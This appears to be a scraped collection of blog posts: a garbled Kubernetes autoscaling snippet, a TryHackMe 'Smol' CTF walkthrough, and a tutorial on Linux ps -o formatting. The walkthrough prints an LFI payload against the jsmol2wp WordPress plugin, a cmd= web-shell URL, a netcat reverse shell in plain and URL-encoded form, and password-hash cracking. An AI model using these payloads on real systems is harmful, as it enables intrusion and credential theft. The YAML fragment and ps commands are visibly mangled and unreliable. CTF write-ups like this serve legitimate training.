    apiVersion: autoscaling/v2beta2kind: HorizontalPodAutoscaler  name: nginx-hpaspec:    apiVersion: apps/v1    name: nginx  maxReplicas: 10    - type: External        metric:
              name: http_requests_per_second
            target:          averageValue: 100
    kubectl apply -f hpa.yaml

    5️⃣ Test Scaling by Sending Traffic

    Use a load testing tool like to generate HTTP traffic:

    hey -z 1m -c 50 http://nginx.default.svc.cluster.local

    After some time, check if the :

    ✅ If the pod count increases, autoscaling is working!

items.title: Smol (CTF) — TryHackMe Writeup
items.author: z0diac
items.content:
Smol (CTF) — TryHackMe Writeup

Test your enumeration skills on this boot-to-root machine.

In this Capture The Flag (CTF) walkthrough, we explore the challenge on TryHackMe. This challenge tests your enumeration and privilege escalation skills in a boot-to-root scenario. By leveraging techniques such as Local File Inclusion (LFI), exploiting backdoored WordPress plugins, cracking password hashes, and abusing misconfigured sudo privileges, we gain root access and capture the final flag.

Start the machine and collect the “Target IP Address” to begin the scan.

To get an overview of the open ports on the target system, perform an scan using the following command:

sudo nmap -Pn -vv -T4 -n <ip>

The scan detected and To get a full thorough scan, use this  command:

sudo nmap -A -vv -T4 -n <ip>

From the scan results, port is running Apache HTTP Server 2.4.41 on Ubuntu, and accessing it redirects to http://www.smol.thm. This means we need to add www.smol.thm to /etc/hosts to resolve the domain properly.

Then, I accessed the site again, and this time, it worked.

Based on the website and its page source, it appears to be a WordPress-based website.

Before performing , I conducted using :

From the directory enumeration results, I found several key files and directories for further analysis.

First we got some login page.

Second, we noticed the presence of , but it is inaccessible from the browser. This is expected, as WordPress typically restricts direct access to this file since it contains database credentials and other critical configuration settings.

Third, we found the plugin, which is known to have a backdoor according to this article. This could be a potential security risk if the plugin is outdated or modified.

To further analyze vulnerabilities, I proceeded with .

Executing the following command:

During the scan, I discovered that this WordPress site is using the plugin, specifically version , which is outdated and vulnerable.

According to a GitHub report, this plugin contains two critical security vulnerabilities. One of them is an Arbitrary File Read & Server-Side Request Forgery (SSRF) (CVE-2018–20463). The vulnerability exists in the file located at /wp-content/plugins/jsmol2wp/php/jsmol.php

The issue arises because the $query parameter in the file_get_contents() function is directly controllable by an attacker. This allows unauthorized access to arbitrary files on the server using , a technique commonly used in Local File Inclusion (LFI) attacks. By exploiting this, an attacker could retrieve sensitive files such as , which contains database credentials and other critical configuration settings.

Using the PoC, I crafted the following payload to exploit LFI:

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

As you can see, we’re inside the “”.

This successfully retrieved the file, revealing:

  • : wpuser
  • Database password: [REDACTED]

Using these credentials, I logged into wp-login.php successfully.

Upon inspecting the section, I found a private page titled “Webmaster Tasks!!” created by the . This confirmed my earlier suspicion that the Hello Dolly plugin contains a backdoor.

This confirmed my earlier suspicion that the Hello Dolly plugin contains a backdoor.

I read an article about the Hello Dolly backdoor and discovered that its source is located in /wp-content/plugins/hello.php. My idea is to leverage LFI to open the file.

To confirm, I leveraged to access hello.php:

http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php

As you can see, there’s a hidden backdoor that allows an attacker to execute arbitrary system commands. The most suspicious part is the eval(base64_decode(...)) statement, which decodes and executes a Base64-encoded string.

To disguise the backdoor, the function includes seemingly harmless code that fetches and displays a lyric from the “Hello Dolly” song. This makes it look like a normal WordPress function, helping it evade detection.

Then i copy the base64 encoded text and decode it. When decoded, the payload reveals that it checks for a GET parameter named cmd and executes its value using the system() function. This means an attacker can remotely execute system commands by visiting a URL such as http://www.smol.com/x.php?cmd=whoami, effectively gaining command-line access to the server.

Because the lyrics were exposed on the /wp-admin page, I then executed the command on it.

http://www.smol.thm/wp-admin/?cmd=whoami

Executing this command confirmed it is possible to do remote command execution (RCE).

With the help of ChatGPT, I crafted the following payload to establish a reverse shell connection:

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP YOUR_PORT >/tmp/f

After encoding it in using this website, I set up a and successfully obtained a .

cmd%3Drm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20IP%20PORT%20%3E%2Ftmp%2Ff

To stabilize the shell, I used:

python3 -c 'import pty; pty.spawn("/bin/bash")'

I then navigated to /home and found four users: Diego, Gege, Think, and Xavi.

I tried to use cd, but it didn't work. So, I guess I have to extract the database credentials from /wp-config.php first.

MySQL Database Credentials

Checking for open ports using:

I identified MySQL running on port 3306.

Using “ps aux” confirms it too.

Using the wp-config.php credentials, I logged into and discovered that wpuser had extensive privileges, including CREATE USER, FILE, and SHUTDOWN permissions.

Then, I set the database to wordpress and analyze the wp_users table.

It returned a username and its hash.

Cracking Diego’s Password using John The Ripper

I used Diego’s hash and stored it in a file with “:” as a separator to crack it using John The Ripper:

john --format=phpass --wordlist=/usr/share/wordlists/rockyou.txt <hash-file>

We successfully retrieved Diego’s password.

Getting a shell as “Think”

It seems like Diego can navigate through other users’ directories.

In Gege’s directory, there’s a zip file called wordpress.old.zip, but I can't extract it.

It looks like only Gege has the necessary permissions to access the file.

So, I went to the “think” directory and found the .ssh folder. Inside, there was an id_rsa file. With this, I was able to SSH into "think."

Now, we’re in as the “think” user.

Getting Gege’s Shell by Reading /etc/pam.d/su

I can’t find anything interesting, but this /etc/pam.d/su configuration file modifies the authentication process for the su command, allowing specific users to bypass password authentication. The first line, auth sufficient pam_rootok.so, permits the root user to switch users without a password. The second line, auth [success=ignore default=1] pam_succeed_if.so user = gege, checks if the user is "gege." If they are, the rule is ignored; otherwise, authentication proceeds to the next rule. The third line, auth sufficient pam_succeed_if.so use uid user = think, allows the user "think" to switch users without authentication.

So, I tried switching to the “gege” user using the “think” account, and it worked — without requiring authentication.

With Gege’s access, I was able to extract the zip file to my computer.

It required a password, so I used zip2john to crack it.

The attack was successful!

After extracting the contents, I checked the wp-config.php file to see if there was anything interesting inside.

Sure enough, I found the credentials for Xavi.

Using these credentials, I switched to the Xavi user with su, and it worked.

Misconfigured Sudo Privileges

I tried to find SUID binaries but didn’t find anything powerful for privilege escalation. However, when I checked for misconfigured sudo privileges using sudo -l, it confirmed that the user had full sudo privileges across all commands and users.

Taking advantage of this, I used it to read the root.txt file in the root directory, successfully retrieving the second flag!

In this writeup, we demonstrated how various exploitation techniques were used to gain unauthorized access and escalate privileges in the TryHackMe Smol (CTF) challenge. Through a combination of reconnaissance, enumeration, WordPress exploitation, and privilege escalation, we successfully leveraged vulnerabilities such as Local File Inclusion (LFI), backdoored plugins, password hash cracking, and misconfigured sudo privileges to gain root access.

items.title: The Linux ps -o Flag: Unleashing the Power of Process Customization
items.author: Engineer
items.content:
The ps command in Linux is a powerhouse for managing and inspecting running processes. Most users rely on basic options like ps aux or ps -ef, but today, we’ll explore a hidden gem: the -o flag. This option allows you to tailor the output ps exactly how you want, making it an indispensable tool for system administrators, developers, and DevOps professionals.

The -o (format) flag in ps lets users specify exactly which process attributes they want to display. Instead of being stuck with the default columns, you get to choose relevant fields, reducing clutter and enhancing readability.

  • Customization: Show only the information you need.
  • Scripting-Friendly: Useful in automation where structured output is crucial.
  • Readability: Get rid of unnecessary fields and focus on what matters.

1. Displaying Process IDs and Command Names

This provides a clear view of process IDs and their respective commands.

2. Checking CPU and Memory Usage of Processes

ps -eo pid,%cpu,%mem,comm — sort=-%cpu

Now, you instantly see which processes are consuming the most CPU.

3. Finding the User Running Each Process

This is particularly useful when diagnosing permission or ownership issues.

4. Formatting Start Times in a Readable Way

No more guessing when a process started!

You can rename column headers with =:

ps -eo pid=Process_ID,comm=Command

Combining multiple fields gives deeper insights:

ps -eo pid,ppid,cmd,%cpu,%mem — sort=-%mem

The ps -o flag is an underrated but immensely powerful feature that gives you total control over process monitoring. Whether you’re debugging an issue, writing scripts, or just want cleaner output, this flag is your best friend. Next time you type ps, ditch the defaults and craft your perfect view with -o!
